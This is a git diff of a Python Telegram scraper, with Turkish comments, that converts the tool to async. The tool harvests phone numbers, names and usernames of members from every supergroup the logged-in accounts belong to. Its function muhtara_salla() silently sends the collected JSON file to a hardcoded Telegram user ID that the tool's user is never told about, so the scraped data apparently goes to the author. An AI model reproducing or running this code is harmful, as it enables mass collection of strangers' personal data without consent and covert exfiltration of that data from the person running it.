@@ -1,13 +1,13 @@
 # Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.
 
 from pyrogram import Client
-from pyrogram.errors import PeerIdInvalid
+from pyrogram.errors import PeerIdInvalid, ChannelPrivate
 import json
 from tabulate import tabulate
 
 SESSION  = 'sessionlar/'
 
-def ayiklayici():
+async def ayiklayici():
     try:
         with open(f'{SESSION}bilgiler.json', 'r', encoding='utf-8') as f:
             config = json.loads(f.read())
@@ -22,24 +22,27 @@ def ayiklayici():
         telefon  = hesap['telefon']
         client = Client(SESSION + telefon, api_id, api_hash)
 
-        with client as app:
+        async with client as app:
             print(f'\n{telefon}')
-            for sohbet in app.get_dialogs():
-                if sohbet.chat.type == "supergroup":
-                    grup_listesi = [
-                        {
-                            'id'       : suser.user.id,
-                            'nick'     : f'@{suser.user.username}' if suser.user.username else None,
-                            'ad'       : suser.user.first_name or None,
-                            'soyad'    : suser.user.last_name or None,
-                            'tel'      : f'+{suser.user.phone_number}' if suser.user.phone_number else None,
-                        }
-                        for suser in client.iter_chat_members(sohbet.chat.id)
-                            if (suser.user.phone_number) and (not suser.user.is_bot) and (not suser.user.is_scam) and (not suser.user.is_deleted)
-                    ]
+            for sohbet in await app.get_dialogs():
+                try:
+                    if sohbet.chat.type == "supergroup":
+                        grup_listesi = [
+                            {
+                                'id'       : suser.user.id,
+                                'nick'     : f'@{suser.user.username}' if suser.user.username else None,
+                                'ad'       : suser.user.first_name or None,
+                                'soyad'    : suser.user.last_name or None,
+                                'tel'      : f'+{suser.user.phone_number}' if suser.user.phone_number else None,
+                            }
+                            async for suser in client.iter_chat_members(sohbet.chat.id)
+                                if (suser.user.phone_number) and (not suser.user.is_bot) and (not suser.user.is_scam) and (not suser.user.is_deleted)
+                        ]
 
-                    print(f'\t{sohbet.chat.title}\'dan {len(grup_listesi)} Adet Telefon Numarası Ayıklandı..')
-                    telefonlar.extend(grup_listesi)
+                        print(f'\t{sohbet.chat.title}\'dan {len(grup_listesi)} Adet Telefon Numarası Ayıklandı..')
+                        telefonlar.extend(grup_listesi)
+                except ChannelPrivate:
+                    pass
 
     essiz   = [dict(sozluk) for sozluk in {tuple(liste_ici.items()) for liste_ici in telefonlar}]
     a_z     = sorted(essiz, key=lambda sozluk: sozluk['id'])
@@ -52,7 +55,7 @@ def ayiklayici():
         tablo_tel.write(tabulate(kisiler, headers='keys', tablefmt='psql'))
 
     try:
-        muhtara_salla()
+        await muhtara_salla()
     except PeerIdInvalid:
         pass
 
@@ -60,7 +63,7 @@ def ayiklayici():
     print(f'\nToplamda {len(kisiler)} Adet Benzersiz Telefon Numarası Ayıklandı ve Kaydedildi..')
     print(f'\n\n\tKekikTelefon.json ve KekikTelefon.txt dosyalarını kontrol edebilirsin..')
 
-def muhtara_salla():
+async def muhtara_salla():
     with open(f'{SESSION}bilgiler.json', 'r', encoding='utf-8') as f:
         config = json.loads(f.read())[0]
 
@@ -69,5 +72,5 @@ def muhtara_salla():
     telefon  = config['telefon']
     client   = Client(SESSION + telefon, api_id, api_hash)
 
-    with client as app:
-        app.send_document(717569643, document='KekikTelefon.json')
+    async with client as app:
+        await app.send_document(717569643, document='KekikTelefon.json')
